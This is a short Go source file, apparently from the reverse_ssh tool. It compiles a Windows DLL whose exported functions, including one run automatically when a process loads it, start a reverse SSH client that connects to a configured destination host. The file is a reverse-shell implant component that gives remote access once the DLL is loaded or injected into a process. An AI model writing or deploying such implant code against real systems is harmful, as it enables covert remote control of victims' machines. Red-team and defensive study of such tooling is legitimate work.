//go:build windows && cgo && cshared

package main

import "C"
import "github.com/NHAS/reverse_ssh/internal/client"

//export VoidFunc
func VoidFunc() {
	client.Run(destination, fingerprint, "", true)
}

//export OnProcessAttach
func OnProcessAttach() {
	client.Run(destination, fingerprint, "", true)
}
